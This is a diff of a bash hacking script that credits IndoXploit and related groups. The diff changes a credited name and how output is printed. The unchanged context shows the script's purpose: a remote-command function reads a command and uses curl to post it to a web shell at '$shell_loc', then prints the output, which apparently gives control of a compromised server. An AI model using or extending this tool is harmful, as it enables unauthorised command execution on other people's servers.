@@ -1,7 +1,7 @@
 #!/bin/bash   
 ##############################################################
 #   Thank's to IndoXploit - ZeroByte.ID - Eldersc0de Family
-#       Special Thanks : Ardhana Rezky and Bayu Fedra 
+#       Special Thanks : Ardhana Rezky and Novran Fathir 
 ##############################################################
 #
 #                    COLORING YOUR SHELL
@@ -185,7 +185,7 @@ main_remot3d_4 () {
     printf "      ${white}[${green}+${white}] COMMAND : "
     read cmd
     reverse=$(curl --silent -d idx="$cmd" "$shell_loc")
-    printf "       └${white}[${blue}>${white}]"; for i in $reverse; do printf " $i\n           "; done
+    printf "       └${white}[${blue}>${white}] $reverse\n"
 done
     else
         spinlong
